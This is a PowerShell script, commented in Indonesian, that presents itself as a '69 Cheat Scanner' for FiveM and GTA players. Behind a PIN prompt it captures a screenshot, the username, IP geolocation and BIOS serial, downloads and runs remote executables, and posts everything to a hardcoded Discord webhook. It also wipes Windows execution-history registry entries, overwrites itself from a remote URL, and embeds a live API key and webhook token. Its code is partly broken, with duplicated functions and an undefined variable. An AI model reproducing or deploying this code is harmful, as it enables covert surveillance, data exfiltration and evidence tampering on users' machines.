# Cheat Scanner PowerShell GUI vFinal - Optimized & Secure

# === DEPENDENSI ===
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Windows.Forms

# === KONFIGURASI ===
$VT_API_KEY = "2c3dd207ada7c39736a3ef77f6a497381a448c9fd80dce9b1d567648236fb34a"
$VT_API_KEY = "2c3dd207ada7c39736a3ef77f6a497381a448c9fd80dce9b1d567648236fb34a"
$YARA_URL   = "https://raw.githubusercontent.com/Jesstaslim/RuleMe/main/cheat-rules.yar"
$YARA_BIN   = "https://github.com/Jesstaslim/RuleMe/raw/main/yara64.exe"
$SCRIPT_URL = "https://raw.githubusercontent.com/Jesstaslim/RuleMe/main/cheat-scanner.ps1"
$WEBHOOKS   = @("https://discord.com/api/webhooks/1387456199976554547/3u10xJGxPfZY-v8eq1tq33Na8Y_CS8tKkPckRCigiuFUFLct74o0wwteOlm-LGe934fn")

# === FOLDER SCAN ===
$SCAN_FOLDERS = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:TEMP")
$GAME_FOLDERS = @("$env:APPDATA\CitizenFX\fivem", "$env:LOCALAPPDATA\FiveM", "$env:APPDATA\Steam", "$env:LOCALAPPDATA\Rockstar Games")
$SCAN_FOLDERS += $GAME_FOLDERS

# === VALIDASI PIN ===
function Verify-Pin($userPin) {
    $usedFile = "$env:TEMP\used_pin.txt"
    if (!(Test-Path $usedFile)) { New-Item -Path $usedFile -ItemType File -Force | Out-Null }
    $usedPins = Get-Content $usedFile -ErrorAction SilentlyContinue
    if ($usedPins -contains $userPin) { return "used" }
    try {
        $validPins = Invoke-RestMethod -Uri $PIN_URL -ErrorAction Stop
        $validList = $validPins -split "`n" | ForEach-Object { $_.Trim() }
        if ($validList -contains $userPin) {
            Add-Content -Path $usedFile -Value $userPin
            return "valid"
        } else {
            return "invalid"
        }
    } catch { return "error" }
}

# === AMBIL INFO SYSTEM, GEOIP, HWID ===
function Get-SystemInfo {
    $geo = try { Invoke-RestMethod -Uri "https://ipinfo.io/json" } catch { @{ ip = "Unknown"; country = "?"; city = "?"; region = "?"; loc = "?" } }
    $os = Get-CimInstance Win32_OperatingSystem
    $cpu = Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name
    $ram = [math]::Round($os.TotalVisibleMemorySize / 1MB, 2)
    $uptime = (Get-Date) - $os.LastBootUpTime
    $hwid = try { (Get-CimInstance Win32_BIOS).SerialNumber.Trim() } catch { "Unknown" }
    return @{
        Username = $env:USERNAME
        Computer = $env:COMPUTERNAME
        OS = $os.Caption
        CPU = $cpu
        RAM = "$ram GB"
        IP = $geo.ip
        Location = "$($geo.city), $($geo.region), $($geo.country)"
        Uptime = "$([math]::Round($uptime.TotalHours, 2)) Hours"
        HWID = $hwid
        LocRaw = $geo.loc
    }
}

# === DETEKSI PROSES HILANG ===
function Detect-GhostProcesses {
    $before = Get-Process | Select-Object -ExpandProperty Id
    Start-Sleep -Milliseconds 750
    $after = Get-Process | Select-Object -ExpandProperty Id
    return $before | Where-Object { $_ -notin $after }
}

# === SCREENSHOT ===
function Take-Screenshot {
    $bmp = New-Object Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
    $path = "$env:TEMP\screenshot.png"
    $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    return $path
}

# === ZIP + ENKRIPSI ===
function Compress-LogWithPassword {
    param($logPath, $password)
    $zipPath = "$env:TEMP\report_encrypted.zip"
    $7zPath = "$env:TEMP\7za.exe"
    if (-not (Test-Path $7zPath)) {
        Invoke-WebRequest -Uri "https://github.com/NaufalAmbatukam/RuleMe/raw/main/7za.exe" -OutFile $7zPath -UseBasicParsing
    }
    & $7zPath a -tzip -p$password -mem=AES256 $zipPath $logPath | Out-Null
    return $zipPath
}

# === WEBHOOK KIRIM ===
function Send-Webhook {
    param($webhook, $message, $info, $screenshotPath, $zipPath)

    $embed = @{
        username = "69-Scanner"
        embeds = @(@{
            title = "🔍 Laporan Pemindaian"
            description = "**$message**"
            color = 16753920
            fields = @(
                @{ name = "👤 Username"; value = $info.Username; inline = $true },
                @{ name = "🖥️ Komputer"; value = $info.Computer; inline = $true },
                @{ name = "🌍 IP"; value = $info.IP; inline = $true },
                @{ name = "📍 Lokasi"; value = $info.Location; inline = $true },
                @{ name = "🔑 HWID"; value = $info.HWID; inline = $false }
            )
            footer = @{ text = "Waktu: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body $embed -ContentType 'application/json'
        if (Test-Path $zipPath) {
            Invoke-RestMethod -Uri $webhook -Method Post -InFile $zipPath -ContentType 'application/octet-stream'
        }
        if (Test-Path $screenshotPath) {
            Invoke-RestMethod -Uri $webhook -Method Post -InFile $screenshotPath -ContentType 'application/octet-stream'
        }
    } catch {
        Write-Warning "Gagal mengirim ke webhook."
    }
}

# === NOTIFIKASI ===
function Show-ToastNotification {
    param($title, $message)
    $notify = New-Object System.Windows.Forms.NotifyIcon
    $notify.Icon = [System.Drawing.SystemIcons]::Information
    $notify.Visible = $true
    $notify.BalloonTipTitle = $title
    $notify.BalloonTipText = $message
    $notify.ShowBalloonTip(5000)
    Start-Sleep -Seconds 6
    $notify.Dispose()
}

# === BERSIHKAN HISTORI ===
function Clear-ExecutionHistory {
    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    if (Test-Path $regPath) {
        $props = (Get-ItemProperty -Path $regPath).PSObject.Properties
        foreach ($prop in $props) {
            if ($prop.Name -notmatch '^PS') {
                Remove-ItemProperty -Path $regPath -Name $prop.Name -Force
            }
        }
    }
}

# === GUI VALIDASI PIN ===
[xml]$pinXaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        Title="🔒 Validasi PIN" Height="220" Width="420"
        ResizeMode="NoResize" WindowStartupLocation="CenterScreen"
        Background="#1E1E1E">
    <Grid Margin="20">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>
        <TextBlock Text="🛡️ Masukkan PIN Anda untuk melanjutkan"
                   Grid.Row="0" Margin="0,0,0,20"
                   Foreground="White" FontFamily="Consolas"
                   FontSize="16" HorizontalAlignment="Center"/>
        <TextBox Name="PinInput" Grid.Row="1" Height="30"
                 FontSize="14" HorizontalAlignment="Stretch"
                 Background="#2a2a2a" Foreground="White"
                 FontFamily="Consolas"/>
        <Button Name="SubmitBtn" Grid.Row="2" Content="✔️ Verifikasi"
                Height="35" Margin="0,20,0,0"
                Background="#3C3C3C" Foreground="White"
                FontWeight="Bold" FontSize="14"
                HorizontalAlignment="Center" Width="120"/>
    </Grid>
</Window>
"@

# === Render XAML PIN Window ===
$pinReader = New-Object System.Xml.XmlNodeReader $pinXaml
$pinWindow = [Windows.Markup.XamlReader]::Load($pinReader)
$PinInput  = $pinWindow.FindName("PinInput")
$SubmitBtn = $pinWindow.FindName("SubmitBtn")

# === Event Klik Verifikasi PIN ===
$SubmitBtn.Add_Click({
    $SubmitBtn.IsEnabled = $false
    $pin = $PinInput.Text.Trim()

    if ([string]::IsNullOrWhiteSpace($pin)) {
        [System.Windows.MessageBox]::Show("⚠️ PIN tidak boleh kosong.", "Validasi", "OK", "Warning")
        $SubmitBtn.IsEnabled = $true
        return
    }

    $check = Verify-Pin -userPin $pin
    switch ($check) {
        "valid" {
            [System.Windows.MessageBox]::Show("✅ PIN Valid. Akses diterima.", "Berhasil", "OK", "Information")
            $pinWindow.DialogResult = $true
            $pinWindow.Close()
        }
        "used" {
            [System.Windows.MessageBox]::Show("❌ PIN sudah pernah digunakan.", "PIN Kadaluarsa", "OK", "Error")
            $pinWindow.DialogResult = $false
            $pinWindow.Close()
        }
        "invalid" {
            [System.Windows.MessageBox]::Show("❌ PIN salah atau tidak terdaftar.", "Gagal", "OK", "Error")
            $pinWindow.DialogResult = $false
            $pinWindow.Close()
        }
        "error" {
            [System.Windows.MessageBox]::Show("❌ Gagal mengakses daftar PIN.", "Koneksi Error", "OK", "Error")
            $pinWindow.DialogResult = $false
            $pinWindow.Close()
        }
    }
})

# === Tampilkan Window PIN ===
$result = $pinWindow.ShowDialog()
if (-not $result) {
    Write-Host "❌ PIN tidak valid atau dibatalkan. Keluar."
    exit
}

# === GUI UTAMA ===
[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        Title="🛡️ 69 Cheat Scanner" Height="350" Width="500"
        ResizeMode="NoResize" WindowStartupLocation="CenterScreen"
        Background="#1E1E1E">
    <StackPanel Margin="20">
        <TextBlock Text="🛠️ 69 Cheat Scanner" FontSize="20" FontWeight="Bold"
                   Foreground="Lime" HorizontalAlignment="Center" FontFamily="Consolas"/>
        <Button Name="ScanButton" Content="▶ Mulai Scan" Height="45" FontSize="16" Margin="0,10"
                Background="#252525" Foreground="White" FontWeight="Bold"/>
        <ProgressBar Name="ScanProgress" Height="25" Minimum="0" Maximum="100" Foreground="Lime" Background="#444"/>
        <TextBlock Name="StatusText" FontSize="14" Margin="0,10,0,0"
                   Text="Menunggu tindakan..." Foreground="Lime" FontFamily="Consolas"/>
        <Button Name="ExitButton" Content="❌ Keluar" Height="35" FontSize="14" 
                Background="#252525" Foreground="White" FontWeight="Bold" Margin="0,10,0,0"/>
    </StackPanel>
</Window>
"@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)
$ScanButton = $window.FindName("ScanButton")
$ScanProgress = $window.FindName("ScanProgress")
$StatusText = $window.FindName("StatusText")
$ExitButton = $window.FindName("ExitButton")

$ExitButton.Add_Click({ $window.Close() })

# === AKSI TOMBOL SCAN ===
$ScanButton.Add_Click({
    $ScanButton.IsEnabled = $false
    $StatusText.Text = "🔍 Memulai pemindaian..."
    $ScanProgress.Value = 5

    $pattern = '(?i)cheat|engine|inject|phantom|xenos|moonsec|eulen|lumia|modmenu|modz|riptide|kiddion|fivem|executor|menumod|teleport|aimbot|wallhack|byfron|lua|dnspy|lynx|aries|redengine|neos|hydra|quantum|wr3nch|brutan|fallout|elips|eruption|blast|huracan|dreammenu|phantomhax|shackle|fap|aries|bat|inferno|rampage|revenge|desudo|lux|h4x|illuminati|brofx|fep|madmenu|lynxv2|nuke|opmenu|hx'

    $hiddenHits = @()
    $logContentHits = @()
    foreach ($folder in $SCAN_FOLDERS) {
        if (Test-Path $folder) {
            # Scan file tersembunyi & sistem
            $hiddenHits += Get-ChildItem -Path $folder -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
                ($_.Attributes -match 'Hidden|System') -and ($_.Name -match $pattern)
            } | Select-Object -ExpandProperty FullName

            # Scan isi file teks
            $logContentHits += Get-ChildItem -Path $folder -Recurse -Include *.txt, *.log, *.ini -ErrorAction SilentlyContinue | Where-Object {
                (Get-Content $_.FullName -ErrorAction SilentlyContinue) -match $pattern
            } | Select-Object -ExpandProperty FullName
        }
    }

    $ScanProgress.Value = 25
    $StatusText.Text = "🧠 Menjalankan YARA..."

    # Download YARA binary & rule
    $yaraPath = "$env:TEMP\yara64.exe"
    $yaraRule = "$env:TEMP\rules.yar"
    if (-not (Test-Path $yaraPath)) {
        Invoke-WebRequest -Uri $YARA_BIN -OutFile $yaraPath -UseBasicParsing
    }
    Invoke-WebRequest -Uri $YARA_URL -OutFile $yaraRule -UseBasicParsing

    $yaraOutput = "$env:TEMP\yara_output.txt"
    $yaraResults = @()
    foreach ($folder in $SCAN_FOLDERS) {
        Start-Process -FilePath $yaraPath -ArgumentList "-r", $yaraRule, $folder -Wait -NoNewWindow -RedirectStandardOutput $yaraOutput
        if (Test-Path $yaraOutput) {
            $yaraResults += Get-Content $yaraOutput
            Remove-Item $yaraOutput -Force
        }
    }

    $ScanProgress.Value = 45
    $StatusText.Text = "☁️ Mengecek VirusTotal..."
})

    $vtFlags = @()
    $executables = Get-ChildItem -Path $SCAN_FOLDERS -Recurse -Include *.exe, *.dll, *.asi -ErrorAction SilentlyContinue
    foreach ($file in $executables) {
        try {
            $hash = (Get-FileHash $file.FullName -Algorithm SHA256).Hash
            $resp = Invoke-RestMethod -Uri "https://www.virustotal.com/api/v3/files/$hash" -Headers @{"x-apikey" = $VT_API_KEY}
            if ($resp.data.attributes.last_analysis_stats.malicious -gt 0) {
                $vtFlags += "$($file.FullName): $($resp.data.attributes.last_analysis_stats.malicious) malicious"
            }
        } catch {}
    }

    $ScanProgress.Value = 75
    $StatusText.Text = "📝 Membuat laporan..."

    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
    $logPath = "$env:TEMP\scan_report_$timestamp.txt"
    $screenshot = Take-Screenshot

    $report = @"
=== SCAN REPORT ($timestamp) ===

[Hidden File Hits]
$($hiddenHits -join "`n")

[File Content Hits]
$($logContentHits -join "`n")

[YARA Results]
$($yaraResults -join "`n")

[VirusTotal Flags]
$($vtFlags -join "`n")
"@
    $report | Out-File -FilePath $logPath -Encoding UTF8

    $ScanProgress.Value = 90
    $StatusText.Text = "📤 Mengirim ke Discord..."

    $info = Get-SystemInfo
    foreach ($webhook in $WEBHOOKS) {
        Send-WebhookEmbed -webhookUrl $webhook -message "Pemindaian selesai." -sysInfo $info -screenshotPath $screenshot -logPath $logPath
    }

    $ScanProgress.Value = 100
    $StatusText.Text = "✅ Selesai! Laporan telah dikirim."
})

# === Fungsi: Ambil HWID (BIOS Serial) ===
function Get-HWID {
    try {
        $bios = Get-CimInstance Win32_BIOS | Select-Object -ExpandProperty SerialNumber
        return $bios.Trim()
    } catch {
        return "Unknown-HWID"
    }
}

# === Fungsi: Lokasi Geo berdasarkan IP ===
function Get-GeoLocation {
    try {
        $info = Invoke-RestMethod -Uri "https://ipinfo.io/json"
        return @{
            IP       = $info.ip
            Country  = $info.country
            Region   = $info.region
            City     = $info.city
            Location = $info.loc
        }
    } catch {
        return @{ IP = "?", Country = "?", Region = "?", City = "?", Location = "?" }
    }
}

# === Fungsi: Kompres File Log dengan Password ===
function Compress-LogWithPassword {
    param($logPath, $password)
    $outPath = "$env:TEMP\report_encrypted.zip"
    if (Test-Path $outPath) { Remove-Item $outPath -Force }
    $7z = "$env:TEMP\7za.exe"
    if (-not (Test-Path $7z)) {
        Invoke-WebRequest -Uri "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7z.zip"
        Expand-Archive "$env:TEMP\7z.zip" -DestinationPath "$env:TEMP"
    }
    & $7z a -tzip -p$password -mem=AES256 $outPath $logPath | Out-Null
    return $outPath
}

# === Fungsi: Kirim Embed + Attachment ke Webhook ===
function Send-WebhookEmbed {
    param (
        [string]$webhookUrl,
        [string]$message,
        [hashtable]$sysInfo,
        [string]$screenshotPath,
        [string]$logPath
    )

    $geo = Get-GeoLocation
    $hwid = Get-HWID
    $embed = @{
        username = "69-Scanner"
        embeds = @(@{
            title = "🔍 Laporan Pemindaian"
            description = "**$message**"
            color = 16753920
            fields = @(
                @{ name = "👤 Username"; value = $sysInfo.Username; inline = $true },
                @{ name = "🖥️ Komputer"; value = $sysInfo.PC; inline = $true },
                @{ name = "🌍 IP"; value = $geo.IP; inline = $true },
                @{ name = "📍 Lokasi"; value = "$($geo.City), $($geo.Region), $($geo.Country)"; inline = $true },
                @{ name = "🔑 HWID"; value = $hwid; inline = $false }
            )
            footer = @{ text = "Waktu: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
        if (Test-Path $logPath) {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $logPath -ContentType "multipart/form-data"
        }
        if (Test-Path $screenshotPath) {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $screenshotPath -ContentType "multipart/form-data"
        }
    } catch {
        Write-Warning "Gagal mengirim ke webhook."
    }
}

# === Panggil ZIP terenkripsi dan kirim ke Webhook ===
$encryptedZip = Compress-LogWithPassword -logPath $logPath -password "69securepass"

foreach ($webhook in $WEBHOOKS) {
    Send-WebhookEmbed -webhookUrl $webhook -message "Laporan lengkap terenkripsi." -sysInfo $info -screenshotPath $screenshot -logPath $encryptedZip
}

# === Bersihkan Riwayat Eksekusi (Execution History) ===
function Clear-ExecutionHistory {
    $regPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    if (Test-Path $regPath) {
        $regItem = Get-ItemProperty -Path $regPath
        foreach ($prop in $regItem.PSObject.Properties) {
            if ($prop.Name -notmatch '^PS') {
                Remove-ItemProperty -Path $regPath -Name $prop.Name -Force
            }
        }
    }
}
Clear-ExecutionHistory

# === Tampilkan Notifikasi Sistem (Toast) ===
function Show-ToastNotification {
    param($title, $message)
    Add-Type -AssemblyName System.Windows.Forms
    $notify = New-Object System.Windows.Forms.NotifyIcon
    $notify.Icon = [System.Drawing.SystemIcons]::Information
    $notify.Visible = $true
    $notify.BalloonTipTitle = $title
    $notify.BalloonTipText = $message
    $notify.ShowBalloonTip(5000)
    Start-Sleep -Seconds 6
    $notify.Dispose()
}
Show-ToastNotification -title "Scan Selesai" -message "Laporan terenkripsi telah dikirim ke webhook."

# === Auto Update Script ===
function Invoke-AutoUpdate {
    $updateUrl = $SCRIPT_URL
    $currentPath = $MyInvocation.MyCommand.Definition
    try {
        Invoke-WebRequest -Uri $updateUrl -OutFile $currentPath -UseBasicParsing
        [System.Windows.MessageBox]::Show("🔄 Update berhasil! Jalankan ulang script.", "Auto Update", "OK", "Information")
        exit
    } catch {
        [System.Windows.MessageBox]::Show("⚠️ Gagal update. Periksa koneksi.", "Auto Update", "OK", "Error")
    }
}
